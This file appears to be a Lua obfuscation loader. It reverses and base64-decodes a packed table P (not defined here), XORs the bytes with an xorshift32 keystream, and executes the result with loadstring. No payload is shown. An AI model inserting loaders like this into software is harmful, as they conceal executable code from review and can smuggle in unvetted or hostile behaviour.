local function xs32(x)
    x = bit32.bxor(x, bit32.lshift(x, 13))
    x = bit32.bxor(x, bit32.rshift(x, 17))
    x = bit32.bxor(x, bit32.lshift(x, 5))
    return x
end

local function decode64(s)
    local A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local M = {}
    for i = 1, #A do
        M[A:sub(i, i)] = i - 1
    end

    local out = {}
    local n = 0

    for i = 1, #s, 4 do
        local a = M[s:sub(i, i)] or 0
        local b = M[s:sub(i + 1, i + 1)] or 0
        local cs = s:sub(i + 2, i + 2)
        local ds = s:sub(i + 3, i + 3)
        local c = M[cs] or 0
        local d = M[ds] or 0

        n = n + 1
        out[n] = string.char(a * 4 + math.floor(b / 16))

        if cs ~= "" and cs ~= "=" then
            n = n + 1
            out[n] = string.char((b % 16) * 16 + math.floor(c / 4))
        end

        if ds ~= "" and ds ~= "=" then
            n = n + 1
            out[n] = string.char((c % 4) * 64 + d)
        end
    end

    return table.concat(out)
end

local packed = table.concat(P):reverse()
local raw = decode64(packed)

local seed = 1833578265
local out = {}

for i = 1, #raw do
    seed = xs32(seed)
    out[i] = string.char(bit32.band(bit32.bxor(raw:byte(i), seed), 255))
end

local fn, err = loadstring(table.concat(out))
if not fn then
    error(err)
end

return fn()
